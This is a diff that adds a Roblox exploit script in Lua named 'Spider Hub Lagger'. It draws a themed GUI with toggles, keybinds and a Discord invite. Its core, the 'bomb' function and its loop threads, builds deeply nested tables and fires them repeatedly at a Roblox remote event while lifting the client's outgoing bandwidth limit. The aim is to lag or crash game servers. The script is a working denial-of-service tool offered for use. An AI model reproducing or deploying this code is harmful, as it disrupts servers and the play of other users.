@@ -1,0 +1,635 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local ConfigFile = "spiderhubkeybind.json"
+
+local keybind = Enum.KeyCode.V
+local lowEndKeybind = Enum.KeyCode.L
+local laggerActive = false
+local lowEndActive = false
+local isTouchEnabled = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+
+-- Slightly bigger and comfortable scaling with proper spacing
+local viewport = workspace.CurrentCamera.ViewportSize
+local scaleFactor = math.clamp(math.min(viewport.X / 1920, viewport.Y / 1080) * 1.2, 0.9, 1.5)
+
+local uiWidth = math.floor((isTouchEnabled and 290 or 350) * scaleFactor)
+local uiHeight = math.floor((isTouchEnabled and 270 or 300) * scaleFactor)
+local headerHeight = math.floor((isTouchEnabled and 65 or 75) * scaleFactor)
+local titlePosY = math.floor((isTouchEnabled and 10 or 12) * scaleFactor)
+local closeBtnSize = math.floor((isTouchEnabled and 28 or 24) * scaleFactor)
+local closeBtnPos = math.floor((isTouchEnabled and 6 or 6) * scaleFactor)
+local contentTop = math.floor((isTouchEnabled and 80 or 95) * scaleFactor)
+local contentHeight = math.floor((isTouchEnabled and 140 or 160) * scaleFactor)  -- increased height
+local keybindSize = math.floor((isTouchEnabled and 65 or 60) * scaleFactor)
+local keybindTextSize = math.floor((isTouchEnabled and 13 or 12) * scaleFactor)
+local statusTextSize = math.floor((isTouchEnabled and 13 or 12) * scaleFactor)
+local switchSize = math.floor((isTouchEnabled and 42 or 38) * scaleFactor)
+local switchBallSize = math.floor((isTouchEnabled and 18 or 16) * scaleFactor)
+local footerTextSize = math.floor((isTouchEnabled and 10 or 10) * scaleFactor)
+
+local MAIN_CONFIG = {
+    TableIncrease = 265,
+    Tries = 1,
+    LoopWaitTime = 0.85
+}
+
+local LOWEND_CONFIG = {
+    TableIncrease = 1.5,
+    Tries = 1,
+    LoopWaitTime = 0.155
+}
+
+local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+
+-- Spider‑theme: dark base with crimson red accent
+local UI_CONFIG = {
+    MainColor    = Color3.fromRGB(12, 12, 12),
+    StrokeColor  = Color3.fromRGB(50, 50, 50),
+    TextColor    = Color3.fromRGB(240, 240, 240),
+    SubTextColor = Color3.fromRGB(160, 160, 160),
+    AccentColor  = Color3.fromRGB(200, 30, 30),   -- spider red
+    ToggleOn     = Color3.fromRGB(200, 30, 30),
+    ToggleOff    = Color3.fromRGB(35, 35, 35),
+    Font         = Enum.Font.Gotham,
+    CornerRadius = UDim.new(0, 8)
+}
+
+local function SaveConfig()
+    local data = { 
+        Keybind = keybind.Name,
+        LowEndKeybind = lowEndKeybind.Name
+    }
+    pcall(function()
+        writefile(ConfigFile, HttpService:JSONEncode(data))
+    end)
+end
+
+local function LoadConfig()
+    if isfile(ConfigFile) then
+        local success, fileData = pcall(readfile, ConfigFile)
+        if success and fileData and fileData ~= "" then
+            local decodedSuccess, data = pcall(HttpService.JSONDecode, HttpService, fileData)
+            if decodedSuccess and data then
+                if data.Keybind then
+                    keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.V
+                end
+                if data.LowEndKeybind then
+                    lowEndKeybind = Enum.KeyCode[data.LowEndKeybind] or Enum.KeyCode.L
+                end
+            end
+        end
+    end
+end
+
+LoadConfig()
+
+local function resolveRemote(path)
+    local obj = game
+    local cleaned = path:gsub("^game%.", "")
+    for segment in cleaned:gmatch("[^%.]+") do
+        if obj then
+            obj = obj[segment]
+        else
+            return nil
+        end
+    end
+    return obj
+end
+
+local function getmaxvalue(val, isMain)
+    if isMain then
+        return 499999 / (val + 2)
+    else
+        return 58500 / (val + 2)
+    end
+end
+
+local function bomb(tableincrease, tries, isMain)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maximum = getmaxvalue(tableincrease, isMain) or 9999999
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+        if i % 5000 == 0 then task.wait() end
+    end
+    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+    if remote then
+        for i = 1, tries do
+            pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(maintable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(maintable)
+                end
+            end)
+        end
+    end
+end
+
+local mainStatusLabel, mainSwitchBall, lowEndStatusLabel, lowEndSwitchBall, keybindButton, lowEndKeybindButton, footer, contentBg
+local mainLagThread = nil
+local lowEndLagThread = nil
+
+local function stopMainThread()
+    if mainLagThread then
+        task.cancel(mainLagThread)
+        mainLagThread = nil
+    end
+end
+
+local function stopLowEndThread()
+    if lowEndLagThread then
+        task.cancel(lowEndLagThread)
+        lowEndLagThread = nil
+    end
+end
+
+local function startMainThread()
+    stopMainThread()
+    if not laggerActive then return end
+    mainLagThread = task.spawn(function()
+        while laggerActive do
+            pcall(function()
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+            end)
+            task.spawn(function()
+                bomb(MAIN_CONFIG.TableIncrease, MAIN_CONFIG.Tries, true)
+            end)
+            task.wait(MAIN_CONFIG.LoopWaitTime)
+        end
+    end)
+end
+
+local function startLowEndThread()
+    stopLowEndThread()
+    if not lowEndActive then return end
+    lowEndLagThread = task.spawn(function()
+        while lowEndActive do
+            pcall(function()
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+            end)
+            task.spawn(function()
+                bomb(LOWEND_CONFIG.TableIncrease, LOWEND_CONFIG.Tries, false)
+            end)
+            task.wait(LOWEND_CONFIG.LoopWaitTime)
+        end
+    end)
+end
+
+local function updateMainSwitchVisual()
+    local targetPos = laggerActive and (switchSize - switchBallSize - 2) or 2
+    TweenService:Create(mainSwitchBall, TweenInfo.new(0.2), {
+        Position = UDim2.new(0, targetPos, 0.5, -switchBallSize/2),
+        BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+    }):Play()
+    mainStatusLabel.Text = laggerActive and "ON" or "OFF"
+    mainStatusLabel.TextColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.SubTextColor
+end
+
+local function updateLowEndSwitchVisual()
+    local targetPos = lowEndActive and (switchSize - switchBallSize - 2) or 2
+    TweenService:Create(lowEndSwitchBall, TweenInfo.new(0.2), {
+        Position = UDim2.new(0, targetPos, 0.5, -switchBallSize/2),
+        BackgroundColor3 = lowEndActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+    }):Play()
+    lowEndStatusLabel.Text = lowEndActive and "ON" or "OFF"
+    lowEndStatusLabel.TextColor3 = lowEndActive and UI_CONFIG.ToggleOn or UI_CONFIG.SubTextColor
+end
+
+local function toggleLagger()
+    laggerActive = not laggerActive
+    updateMainSwitchVisual()
+    if laggerActive then
+        startMainThread()
+    else
+        stopMainThread()
+    end
+end
+
+local function toggleLowEnd()
+    lowEndActive = not lowEndActive
+    updateLowEndSwitchVisual()
+    if lowEndActive then
+        startLowEndThread()
+    else
+        stopLowEndThread()
+    end
+end
+
+if CoreGui:FindFirstChild("SpiderHubLagger_UI") then
+    CoreGui.SpiderHubLagger_UI:Destroy()
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SpiderHubLagger_UI"
+screenGui.Parent = CoreGui
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.BackgroundColor3 = UI_CONFIG.MainColor
+mainFrame.BorderSizePixel = 0
+mainFrame.Size = UDim2.new(0, uiWidth, 0, uiHeight)
+mainFrame.Position = UDim2.new(0.5, -uiWidth/2, 0.5, -uiHeight/2)
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UI_CONFIG.CornerRadius
+mainCorner.Parent = mainFrame
+
+local outerStroke = Instance.new("UIStroke")
+outerStroke.Color = UI_CONFIG.StrokeColor
+outerStroke.Thickness = 1
+outerStroke.Transparency = 0.3
+outerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+outerStroke.Parent = mainFrame
+
+-- Header
+local header = Instance.new("Frame")
+header.Name = "Header"
+header.BackgroundTransparency = 1
+header.Size = UDim2.new(1, 0, 0, headerHeight)
+header.Parent = mainFrame
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.BackgroundTransparency = 1
+titleLabel.Position = UDim2.new(0, 12, 0, titlePosY)
+titleLabel.Size = UDim2.new(0, uiWidth - 90, 0, 30)
+titleLabel.Font = UI_CONFIG.Font
+titleLabel.Text = "SPIDER HUB LAGGER"
+titleLabel.TextColor3 = UI_CONFIG.TextColor
+titleLabel.TextSize = isTouchEnabled and 14 or 16
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.Parent = header
+
+-- Minimize button (square, with background and stroke)
+local minimizeBtn = Instance.new("TextButton")
+minimizeBtn.Name = "MinimizeBtn"
+minimizeBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+minimizeBtn.Size = UDim2.new(0, closeBtnSize, 0, closeBtnSize)
+minimizeBtn.Position = UDim2.new(1, -closeBtnSize*2 - 10, 0, closeBtnPos)
+minimizeBtn.Font = UI_CONFIG.Font
+minimizeBtn.Text = "−"
+minimizeBtn.TextColor3 = UI_CONFIG.TextColor
+minimizeBtn.TextSize = isTouchEnabled and 16 or 14
+minimizeBtn.AutoButtonColor = false
+minimizeBtn.Parent = header
+
+local minimizeStroke = Instance.new("UIStroke")
+minimizeStroke.Color = Color3.fromRGB(60, 60, 60)
+minimizeStroke.Thickness = 1
+minimizeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+minimizeStroke.Parent = minimizeBtn
+
+-- Close button (now just the letter "X", no background, no stroke, no square)
+local closeBtn = Instance.new("TextButton")
+closeBtn.Name = "CloseBtn"
+closeBtn.BackgroundTransparency = 1  -- completely transparent background
+closeBtn.Position = UDim2.new(1, -closeBtnSize - 6, 0, closeBtnPos)
+closeBtn.Size = UDim2.new(0, closeBtnSize, 0, closeBtnSize)
+closeBtn.Font = UI_CONFIG.Font
+closeBtn.Text = "X"
+closeBtn.TextColor3 = UI_CONFIG.TextColor
+closeBtn.TextSize = isTouchEnabled and 16 or 14
+closeBtn.AutoButtonColor = false
+closeBtn.Parent = header
+
+-- No stroke, no UICorner for close button, it's just plain text
+
+-- Hover effect for minimize button (red on hover)
+minimizeBtn.MouseEnter:Connect(function()
+    minimizeBtn.BackgroundColor3 = UI_CONFIG.AccentColor
+    minimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    minimizeStroke.Color = UI_CONFIG.AccentColor
+end)
+minimizeBtn.MouseLeave:Connect(function()
+    minimizeBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    minimizeBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
+    minimizeStroke.Color = Color3.fromRGB(60, 60, 60)
+end)
+
+-- Hover effect for close button (just changes text color to red)
+closeBtn.MouseEnter:Connect(function()
+    closeBtn.TextColor3 = UI_CONFIG.AccentColor
+end)
+closeBtn.MouseLeave:Connect(function()
+    closeBtn.TextColor3 = UI_CONFIG.TextColor
+end)
+
+closeBtn.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+local isMinimized = false
+minimizeBtn.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    if isMinimized then
+        mainFrame.Size = UDim2.new(0, uiWidth, 0, headerHeight)
+        contentBg.Visible = false
+        footer.Visible = false
+        minimizeBtn.Text = "+"
+    else
+        mainFrame.Size = UDim2.new(0, uiWidth, 0, uiHeight)
+        contentBg.Visible = true
+        footer.Visible = true
+        minimizeBtn.Text = "−"
+    end
+end)
+
+-- Content area (taller, with space for two rows)
+contentBg = Instance.new("Frame")
+contentBg.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+contentBg.BackgroundTransparency = 0.5
+contentBg.Size = UDim2.new(1, -16, 0, contentHeight)
+contentBg.Position = UDim2.new(0, 8, 0, contentTop)
+contentBg.Parent = mainFrame
+
+local contentCorner = Instance.new("UICorner")
+contentCorner.CornerRadius = UDim.new(0, 6)
+contentCorner.Parent = contentBg
+
+local contentStroke = Instance.new("UIStroke")
+contentStroke.Color = Color3.fromRGB(50, 50, 50)
+contentStroke.Thickness = 1
+contentStroke.Parent = contentBg
+
+-- Main Lagger row (top half)
+local mainRow = Instance.new("Frame")
+mainRow.BackgroundTransparency = 1
+mainRow.Size = UDim2.new(1, -16, 0, 55)
+mainRow.Position = UDim2.new(0, 8, 0, isTouchEnabled and 8 or 10)
+mainRow.Parent = contentBg
+
+local mainLabel = Instance.new("TextLabel")
+mainLabel.Size = UDim2.new(0, 100, 0, isTouchEnabled and 26 or 28)
+mainLabel.Position = UDim2.new(0, 0, 0, 0)
+mainLabel.BackgroundTransparency = 1
+mainLabel.Text = "Main Lagger"
+mainLabel.TextColor3 = UI_CONFIG.TextColor
+mainLabel.Font = UI_CONFIG.Font
+mainLabel.TextSize = statusTextSize
+mainLabel.TextXAlignment = Enum.TextXAlignment.Left
+mainLabel.Parent = mainRow
+
+mainStatusLabel = Instance.new("TextLabel")
+mainStatusLabel.Size = UDim2.new(0, 45, 0, isTouchEnabled and 26 or 28)
+mainStatusLabel.Position = UDim2.new(0, 105, 0, 0)
+mainStatusLabel.BackgroundTransparency = 1
+mainStatusLabel.Text = "OFF"
+mainStatusLabel.TextColor3 = UI_CONFIG.SubTextColor
+mainStatusLabel.Font = UI_CONFIG.Font
+mainStatusLabel.TextSize = statusTextSize
+mainStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+mainStatusLabel.Parent = mainRow
+
+local mainSwitch = Instance.new("TextButton")
+mainSwitch.Size = UDim2.new(0, switchSize, 0, isTouchEnabled and 24 or 26)
+mainSwitch.Position = UDim2.new(1, -switchSize, 0, isTouchEnabled and 2 or 3)
+mainSwitch.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+mainSwitch.Text = ""
+mainSwitch.Parent = mainRow
+
+local mainSwitchCorner = Instance.new("UICorner")
+mainSwitchCorner.CornerRadius = UDim.new(1, 0)
+mainSwitchCorner.Parent = mainSwitch
+
+local mainSwitchStroke = Instance.new("UIStroke")
+mainSwitchStroke.Color = Color3.fromRGB(60, 60, 60)
+mainSwitchStroke.Thickness = 1
+mainSwitchStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+mainSwitchStroke.Parent = mainSwitch
+
+mainSwitchBall = Instance.new("Frame")
+mainSwitchBall.Size = UDim2.new(0, switchBallSize, 0, switchBallSize)
+mainSwitchBall.Position = UDim2.new(0, 2, 0.5, -switchBallSize/2)
+mainSwitchBall.BackgroundColor3 = UI_CONFIG.ToggleOff
+mainSwitchBall.Parent = mainSwitch
+
+local mainBallCorner = Instance.new("UICorner")
+mainBallCorner.CornerRadius = UDim.new(1, 0)
+mainBallCorner.Parent = mainSwitchBall
+
+keybindButton = Instance.new("TextButton")
+keybindButton.Size = UDim2.new(0, keybindSize, 0, isTouchEnabled and 26 or 24)
+keybindButton.Position = UDim2.new(0, 0, 0, isTouchEnabled and 32 or 35)
+keybindButton.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+keybindButton.Text = keybind.Name
+keybindButton.TextColor3 = UI_CONFIG.TextColor
+keybindButton.Font = UI_CONFIG.Font
+keybindButton.TextSize = keybindTextSize
+keybindButton.Parent = mainRow
+
+local keybindCorner = Instance.new("UICorner")
+keybindCorner.CornerRadius = UDim.new(0, 4)
+keybindCorner.Parent = keybindButton
+
+local keybindStroke = Instance.new("UIStroke")
+keybindStroke.Color = Color3.fromRGB(60, 60, 60)
+keybindStroke.Thickness = 1
+keybindStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+keybindStroke.Parent = keybindButton
+
+local mainHint = Instance.new("TextLabel")
+mainHint.Size = UDim2.new(0, 90, 0, isTouchEnabled and 26 or 24)
+mainHint.Position = UDim2.new(0, keybindSize + 8, 0, isTouchEnabled and 34 or 37)
+mainHint.BackgroundTransparency = 1
+mainHint.Text = "Keybind"
+mainHint.TextColor3 = UI_CONFIG.SubTextColor
+mainHint.Font = UI_CONFIG.Font
+mainHint.TextSize = statusTextSize - 2
+mainHint.TextXAlignment = Enum.TextXAlignment.Left
+mainHint.Parent = mainRow
+
+-- Low End row (bottom half) – moved further down to avoid overlap
+local lowEndRow = Instance.new("Frame")
+lowEndRow.BackgroundTransparency = 1
+lowEndRow.Size = UDim2.new(1, -16, 0, 55)
+lowEndRow.Position = UDim2.new(0, 8, 0, isTouchEnabled and 75 or 95)  -- adjusted position
+lowEndRow.Parent = contentBg
+
+local lowEndLabel = Instance.new("TextLabel")
+lowEndLabel.Size = UDim2.new(0, 100, 0, isTouchEnabled and 26 or 28)
+lowEndLabel.Position = UDim2.new(0, 0, 0, 0)
+lowEndLabel.BackgroundTransparency = 1
+lowEndLabel.Text = "Low End"
+lowEndLabel.TextColor3 = UI_CONFIG.TextColor
+lowEndLabel.Font = UI_CONFIG.Font
+lowEndLabel.TextSize = statusTextSize
+lowEndLabel.TextXAlignment = Enum.TextXAlignment.Left
+lowEndLabel.Parent = lowEndRow
+
+lowEndStatusLabel = Instance.new("TextLabel")
+lowEndStatusLabel.Size = UDim2.new(0, 45, 0, isTouchEnabled and 26 or 28)
+lowEndStatusLabel.Position = UDim2.new(0, 105, 0, 0)
+lowEndStatusLabel.BackgroundTransparency = 1
+lowEndStatusLabel.Text = "OFF"
+lowEndStatusLabel.TextColor3 = UI_CONFIG.SubTextColor
+lowEndStatusLabel.Font = UI_CONFIG.Font
+lowEndStatusLabel.TextSize = statusTextSize
+lowEndStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+lowEndStatusLabel.Parent = lowEndRow
+
+local lowEndSwitch = Instance.new("TextButton")
+lowEndSwitch.Size = UDim2.new(0, switchSize, 0, isTouchEnabled and 24 or 26)
+lowEndSwitch.Position = UDim2.new(1, -switchSize, 0, isTouchEnabled and 2 or 3)
+lowEndSwitch.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+lowEndSwitch.Text = ""
+lowEndSwitch.Parent = lowEndRow
+
+local lowEndSwitchCorner = Instance.new("UICorner")
+lowEndSwitchCorner.CornerRadius = UDim.new(1, 0)
+lowEndSwitchCorner.Parent = lowEndSwitch
+
+local lowEndSwitchStroke = Instance.new("UIStroke")
+lowEndSwitchStroke.Color = Color3.fromRGB(60, 60, 60)
+lowEndSwitchStroke.Thickness = 1
+lowEndSwitchStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+lowEndSwitchStroke.Parent = lowEndSwitch
+
+lowEndSwitchBall = Instance.new("Frame")
+lowEndSwitchBall.Size = UDim2.new(0, switchBallSize, 0, switchBallSize)
+lowEndSwitchBall.Position = UDim2.new(0, 2, 0.5, -switchBallSize/2)
+lowEndSwitchBall.BackgroundColor3 = UI_CONFIG.ToggleOff
+lowEndSwitchBall.Parent = lowEndSwitch
+
+local lowEndBallCorner = Instance.new("UICorner")
+lowEndBallCorner.CornerRadius = UDim.new(1, 0)
+lowEndBallCorner.Parent = lowEndSwitchBall
+
+lowEndKeybindButton = Instance.new("TextButton")
+lowEndKeybindButton.Size = UDim2.new(0, keybindSize, 0, isTouchEnabled and 26 or 24)
+lowEndKeybindButton.Position = UDim2.new(0, 0, 0, isTouchEnabled and 32 or 35)
+lowEndKeybindButton.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+lowEndKeybindButton.Text = lowEndKeybind.Name
+lowEndKeybindButton.TextColor3 = UI_CONFIG.TextColor
+lowEndKeybindButton.Font = UI_CONFIG.Font
+lowEndKeybindButton.TextSize = keybindTextSize
+lowEndKeybindButton.Parent = lowEndRow
+
+local lowEndKeybindCorner = Instance.new("UICorner")
+lowEndKeybindCorner.CornerRadius = UDim.new(0, 4)
+lowEndKeybindCorner.Parent = lowEndKeybindButton
+
+local lowEndKeybindStroke = Instance.new("UIStroke")
+lowEndKeybindStroke.Color = Color3.fromRGB(60, 60, 60)
+lowEndKeybindStroke.Thickness = 1
+lowEndKeybindStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+lowEndKeybindStroke.Parent = lowEndKeybindButton
+
+local lowEndHint = Instance.new("TextLabel")
+lowEndHint.Size = UDim2.new(0, 90, 0, isTouchEnabled and 26 or 24)
+lowEndHint.Position = UDim2.new(0, keybindSize + 8, 0, isTouchEnabled and 34 or 37)
+lowEndHint.BackgroundTransparency = 1
+lowEndHint.Text = "Keybind"
+lowEndHint.TextColor3 = UI_CONFIG.SubTextColor
+lowEndHint.Font = UI_CONFIG.Font
+lowEndHint.TextSize = statusTextSize - 2
+lowEndHint.TextXAlignment = Enum.TextXAlignment.Left
+lowEndHint.Parent = lowEndRow
+
+-- Footer: plain text, no background or stroke
+footer = Instance.new("TextLabel")
+footer.BackgroundTransparency = 1
+footer.Position = UDim2.new(0, 0, 1, -(footerTextSize + 14))
+footer.Size = UDim2.new(1, 0, 0, footerTextSize + 4)
+footer.Font = UI_CONFIG.Font
+footer.Text = "discord.gg/AMUDzpSFUd"
+footer.TextColor3 = UI_CONFIG.SubTextColor
+footer.TextSize = footerTextSize
+footer.TextXAlignment = Enum.TextXAlignment.Center
+footer.Parent = mainFrame
+
+mainSwitch.MouseButton1Click:Connect(function()
+    toggleLagger()
+end)
+
+lowEndSwitch.MouseButton1Click:Connect(function()
+    toggleLowEnd()
+end)
+
+local listeningForKey = false
+local listeningForLowEndKey = false
+
+keybindButton.MouseButton1Click:Connect(function()
+    listeningForKey = true
+    listeningForLowEndKey = false
+    keybindButton.Text = "..."
+    keybindStroke.Color = UI_CONFIG.AccentColor
+    lowEndKeybindStroke.Color = Color3.fromRGB(60, 60, 60)
+end)
+
+lowEndKeybindButton.MouseButton1Click:Connect(function()
+    listeningForLowEndKey = true
+    listeningForKey = false
+    lowEndKeybindButton.Text = "..."
+    lowEndKeybindStroke.Color = UI_CONFIG.AccentColor
+    keybindStroke.Color = Color3.fromRGB(60, 60, 60)
+end)
+
+local isDragging = false
+local dragStart = nil
+local startPosition = nil
+
+header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = true
+        dragStart = input.Position
+        startPosition = mainFrame.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(
+            startPosition.X.Scale,
+            startPosition.X.Offset + delta.X,
+            startPosition.Y.Scale,
+            startPosition.Y.Offset + delta.Y
+        )
+    end
+end)
+
+header.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = false
+    end
+end)
+
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    if listeningForKey then
+        if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
+            keybind = input.KeyCode
+            keybindButton.Text = input.KeyCode.Name
+            keybindStroke.Color = Color3.fromRGB(60, 60, 60)
+            listeningForKey = false
+            SaveConfig()
+        end
+    elseif listeningForLowEndKey then
+        if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
+            lowEndKeybind = input.KeyCode
+            lowEndKeybindButton.Text = input.KeyCode.Name
+            lowEndKeybindStroke.Color = Color3.fromRGB(60, 60, 60)
+            listeningForLowEndKey = false
+            SaveConfig()
+        end
+    elseif input.KeyCode == keybind then
+        toggleLagger()
+    elseif input.KeyCode == lowEndKeybind then
+        toggleLowEnd()
+    end
+end)
